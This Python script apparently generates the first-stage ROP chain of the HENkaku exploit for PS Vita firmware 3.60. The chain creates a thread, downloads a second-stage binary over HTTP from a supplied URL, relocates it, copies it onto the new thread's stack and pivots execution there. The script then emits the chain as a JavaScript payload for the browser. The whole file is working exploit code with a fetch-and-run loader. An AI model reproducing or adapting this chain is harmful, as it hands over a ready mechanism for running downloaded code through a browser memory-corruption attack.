#!/usr/bin/env python3

from target_360 import Rop360, G, F
from rop import Ret, Load
from relocatable import SceWebKit_base, SceLibKernel_base, SceLibc_base, \
    SceLibHttp_base, SceNet_base, SceAppMgr_base

from sys import argv, exit

# Constants
stack_size = 6 * 1024 * 1024
max_code_size = stack_size // 2
memblock_size = 1024 * 1024
stack_alloc = 0x1000

def make_rop(henkaku_bin_url, henkaku_bin_len, henkaku_bin_words):
    r = Rop360()
    c = r.caller
    d = r.data

    bases = [0, -1, SceWebKit_base, SceLibKernel_base, SceLibc_base, 
        SceLibHttp_base, SceNet_base, SceAppMgr_base]

    r.pre_alloc_data(
        thread_id=4,
        thread_info=0x80,
        stack_base=4, # second thread will pivot here

        memblock=4,
        memblock_base=4,

        stage2_url_base=henkaku_bin_url,

        http_uid=4,

        bases=len(bases) * 4,

        ldm_buf=7*4,
    )

    c.sceKernelCreateThread("", G.ldm_r1_stuff, 0x10000100, stack_size)
    c.store(Ret, d.thread_id)
    c.store(0x7C, d.thread_info)
    c.sceKernelGetThreadInfo(Load(d.thread_id), d.thread_info)

    # some free space for function calls
    c.add(Load(d.thread_info + 0x34), stack_alloc)
    c.store(Ret, d.stack_base)

    # clean the stack
    c.memset(Load(d.stack_base), 0, stack_size - stack_alloc)

    # temp memblock to read henkaku.bin to it and relocate in place
    # since we can't sceIoRead straight into another thread's stack
    c.sceKernelAllocMemBlock("", 0x0c20d060, memblock_size, 0)
    c.store(Ret, d.memblock)
    c.sceKernelGetMemBlockBase(Load(d.memblock), d.memblock_base)

    # online loader
    c.sceHttpInit(0x10000)
    c.sceHttpCreateTemplate("", 2, 1)
    c.sceHttpCreateConnectionWithURL(Ret, d.stage2_url_base, 0)
    c.sceHttpCreateRequestWithURL(Ret, 0, d.stage2_url_base, 0, 0, 0)
    c.store(Ret, d.http_uid)
    c.sceHttpSendRequest(Load(d.http_uid), 0, 0)
    c.sceHttpReadData(Load(d.http_uid), Load(d.memblock_base), memblock_size)

    # prepare relocation array, same layout as with normal loader, but here relocations are done in rop
    cur_pbase = d.bases
    for i, base in enumerate(bases):
        if i == 1:
            # Special handling for new data_base
            c.add(Load(d.stack_base), max_code_size)
            c.store(Ret, cur_pbase)
        else:
            c.store(base, cur_pbase)
        cur_pbase += 4

    # relocate the second stage rop!
    # Every word is 4 bytes, plus there's relocs at the bottom 1 byte each
    r.relocate_rop(d.memblock_base, henkaku_bin_words, d.bases)

    c.memcpy(Load(d.stack_base), Load(d.memblock_base), henkaku_bin_len)

    # prepare args for LDM gadget
    c.store(Load(d.stack_base), d.ldm_buf+5*4)
    c.store(G.pop_pc, d.ldm_buf+6*4)

    # start second thread
    c.sceKernelStartThread(Load(d.thread_id), 7 * 4, d.ldm_buf)
    c.sceKernelWaitThreadEnd(Load(d.thread_id), 0, 0)

    r.infloop()

    r.compile()
    return r


tpl = """
payload = [{}];
relocs = [{}];
"""

def main():
    if len(argv) != 5:
        print("Usage: loader.py henkaku-bin-url henkaku-bin-file henkaku-bin-words output-js-file")
        return 1

    henkaku_bin_url = argv[1]
    with open(argv[2], "rb") as fin:
        henkaku_bin_data = fin.read()
        henkaku_bin_len = len(henkaku_bin_data)
    henkaku_bin_words = int(argv[3])
    output_file = argv[4]

    rop = make_rop(henkaku_bin_url, henkaku_bin_len, henkaku_bin_words)

    with open(output_file, "w") as fout:
        fout.write(tpl.format(",".join(str(x) for x in rop.compiled_rop), ",".join(str(x) for x in rop.compiled_relocs)))

    return 0


if __name__ == "__main__":
    exit(main())
